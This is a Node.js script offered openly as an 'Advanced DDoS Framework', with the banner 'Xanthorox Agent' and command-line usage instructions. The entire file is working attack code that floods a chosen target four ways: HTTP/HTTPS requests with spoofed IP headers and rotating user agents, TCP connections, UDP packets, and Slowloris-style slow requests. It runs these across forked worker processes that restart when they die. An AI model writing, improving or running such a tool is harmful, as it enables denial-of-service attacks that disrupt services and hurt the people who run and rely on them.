#!/usr/bin/env node

const http = require('http');
const https = require('https');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const os = require('os');
const cluster = require('cluster');
const { URL } = require('url');

// Advanced DDoS Framework
class AdvancedDDoS {
    constructor(options = {}) {
        this.target = options.target || 'http://example.com';
        this.port = options.port || 80;
        this.threads = options.threads || os.cpus().length;
        this.duration = options.duration || 60; // seconds
        this.methods = options.methods || ['GET', 'POST', 'HEAD', 'OPTIONS'];
        this.payloadSize = options.payloadSize || 1024;
        this.randomPayload = options.randomPayload || false;
        this.randomHeaders = options.randomHeaders || true;
        this.proxyList = options.proxyList || [];
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ];
        
        this.stats = {
            requests: 0,
            bytes: 0,
            errors: 0,
            startTime: Date.now()
        };
        
        this.isRunning = false;
        this.attackMethods = [];
        this.statsInterval = null;
    }

    // Generate random payload
    generatePayload(size) {
        if (!this.randomPayload) {
            return 'A'.repeat(size);
        }
        return crypto.randomBytes(size).toString('hex').slice(0, size);
    }

    // Generate random headers
    generateHeaders() {
        const headers = {
            'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        };

        if (this.randomHeaders) {
            headers['X-Forwarded-For'] = Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
            headers['X-Real-IP'] = Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
            headers['X-Originating-IP'] = Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
            headers['X-Remote-IP'] = Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
            headers['X-Remote-Addr'] = Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
        }

        return headers;
    }

    // HTTP/HTTPS Flood
    httpFlood() {
        const url = new URL(this.target);
        const isHttps = url.protocol === 'https:';
        const httpModule = isHttps ? https : http;
        
        const makeRequest = () => {
            if (!this.isRunning) return;

            const method = this.methods[Math.floor(Math.random() * this.methods.length)];
            const headers = this.generateHeaders();
            const payload = method !== 'GET' && method !== 'HEAD' ? this.generatePayload(this.payloadSize) : null;

            const options = {
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method: method,
                headers: headers,
                timeout: 5000,
                rejectUnauthorized: false
            };

            const req = httpModule.request(options, (res) => {
                this.stats.requests++;
                res.on('data', () => {});
                res.on('end', () => {
                    if (this.isRunning) setImmediate(makeRequest);
                });
            });

            req.on('error', (err) => {
                this.stats.errors++;
                if (this.isRunning) setImmediate(makeRequest);
            });

            req.on('timeout', () => {
                req.destroy();
                if (this.isRunning) setImmediate(makeRequest);
            });

            if (payload) {
                req.write(payload);
                this.stats.bytes += payload.length;
            }

            req.end();
        };

        // Launch multiple concurrent requests
        for (let i = 0; i < 100; i++) {
            makeRequest();
        }
    }

    // TCP Flood
    tcpFlood() {
        const url = new URL(this.target);
        const targetHost = url.hostname;
        const targetPort = this.port || (url.protocol === 'https:' ? 443 : 80);

        const createSocket = () => {
            if (!this.isRunning) return;

            const socket = new net.Socket();
            
            socket.connect(targetPort, targetHost, () => {
                this.stats.requests++;
                const payload = this.generatePayload(this.payloadSize);
                socket.write(payload);
                this.stats.bytes += payload.length;
            });

            socket.on('data', (data) => {
                this.stats.bytes += data.length;
            });

            socket.on('error', () => {
                this.stats.errors++;
                if (this.isRunning) setImmediate(createSocket);
            });

            socket.on('close', () => {
                if (this.isRunning) setImmediate(createSocket);
            });

            setTimeout(() => {
                socket.destroy();
                if (this.isRunning) setImmediate(createSocket);
            }, 5000);
        };

        // Launch multiple concurrent connections
        for (let i = 0; i < 50; i++) {
            createSocket();
        }
    }

    // UDP Flood
    udpFlood() {
        const url = new URL(this.target);
        const targetHost = url.hostname;
        const targetPort = this.port || 80;

        const socket = dgram.createSocket('udp4');
        const payload = this.generatePayload(this.payloadSize);

        const sendPacket = () => {
            if (!this.isRunning) return;

            socket.send(payload, targetPort, targetHost, (err) => {
                if (!err) {
                    this.stats.requests++;
                    this.stats.bytes += payload.length;
                } else {
                    this.stats.errors++;
                }
                
                if (this.isRunning) setImmediate(sendPacket);
            });
        };

        // Launch multiple concurrent sends
        for (let i = 0; i < 100; i++) {
            sendPacket();
        }
    }

    // Slowloris Attack
    slowlorisAttack() {
        const url = new URL(this.target);
        const isHttps = url.protocol === 'https:';
        const httpModule = isHttps ? https : http;
        
        const createSlowConnection = () => {
            if (!this.isRunning) return;

            const options = {
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname,
                method: 'POST',
                headers: this.generateHeaders(),
                timeout: 30000,
                rejectUnauthorized: false
            };

            const req = httpModule.request(options);
            
            req.write('X-A: ');
            this.stats.requests++;

            const interval = setInterval(() => {
                if (!this.isRunning) {
                    clearInterval(interval);
                    req.end();
                    return;
                }
                req.write('X-A: ');
            }, 5000);

            req.on('error', () => {
                this.stats.errors++;
                clearInterval(interval);
                if (this.isRunning) setImmediate(createSlowConnection);
            });

            req.on('timeout', () => {
                clearInterval(interval);
                req.destroy();
                if (this.isRunning) setImmediate(createSlowConnection);
            });
        };

        // Launch multiple slow connections
        for (let i = 0; i < 200; i++) {
            createSlowConnection();
        }
    }

    // Print stats to console
    printStats() {
        const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const rps = Math.floor(this.stats.requests / elapsed);
        
        // Output in format that can be parsed by web interface
        console.log(`STATS | Requests: ${this.stats.requests} | Errors: ${this.stats.errors} | Bytes: ${this.stats.bytes} | RPS: ${rps} | Success: ${this.stats.requests - this.stats.errors} | Failed: ${this.stats.errors}`);
    }

    // Start the attack
    start() {
        if (this.isRunning) return;
        
        this.isRunning = true;
        this.stats.startTime = Date.now();
        
        console.log(`[+] Starting DDoS attack on ${this.target}`);
        console.log(`[+] Duration: ${this.duration} seconds`);
        console.log(`[+] Threads: ${this.threads}`);
        console.log(`[+] Attack methods: ${this.methods.join(', ')}`);
        console.log('');

        // Start all attack methods
        this.httpFlood();
        this.tcpFlood();
        this.udpFlood();
        this.slowlorisAttack();

        // Display stats every second
        this.statsInterval = setInterval(() => {
            this.printStats();
        }, 1000);

        // Stop after duration
        setTimeout(() => {
            this.stop();
        }, this.duration * 1000);
    }

    // Stop the attack
    stop() {
        this.isRunning = false;
        
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
        }
        
        console.log('\n[-] DDoS attack stopped');
        console.log(`[+] Total requests: ${this.stats.requests}`);
        console.log(`[+] Total errors: ${this.stats.errors}`);
        console.log(`[+] Total bytes: ${this.stats.bytes}`);
        console.log(`[+] Duration: ${Math.floor((Date.now() - this.stats.startTime) / 1000)} seconds`);
    }
}

// Multi-process attack launcher
if (cluster.isMaster) {
    console.log('[Xanthorox Agent] Advanced DDoS Framework');
    console.log('[+] System cores:', os.cpus().length);
    
    const options = {
        target: process.argv[2] || 'http://example.com',
        port: parseInt(process.argv[3]) || 80,
        threads: parseInt(process.argv[4]) || os.cpus().length,
        duration: parseInt(process.argv[5]) || 60
    };

    console.log(`[+] Target: ${options.target}:${options.port}`);
    console.log(`[+] Threads: ${options.threads}`);
    console.log(`[+] Duration: ${options.duration} seconds`);
    console.log('');

    // Fork worker processes
    for (let i = 0; i < options.threads; i++) {
        cluster.fork(options);
    }

    cluster.on('exit', (worker) => {
        console.log(`[!] Worker ${worker.id} died. Restarting...`);
        cluster.fork(options);
    });
} else {
    // Worker process
    const ddos = new AdvancedDDoS({
        target: process.env.target,
        port: parseInt(process.env.port),
        threads: 1,
        duration: parseInt(process.env.duration)
    });
    
    ddos.start();
}

// Usage instructions
if (require.main === module && process.argv.length < 3) {
    console.log('Usage: node ddos.js <target_url> [port] [threads] [duration]');
    console.log('Example: node ddos.js http://example.com 80 4 60');
    console.log('');
    console.log('Parameters:');
    console.log('  target_url - Target URL (http://example.com)');
    console.log('  port       - Target port (default: 80)');
    console.log('  threads    - Number of threads (default: CPU cores)');
    console.log('  duration   - Attack duration in seconds (default: 60)');
}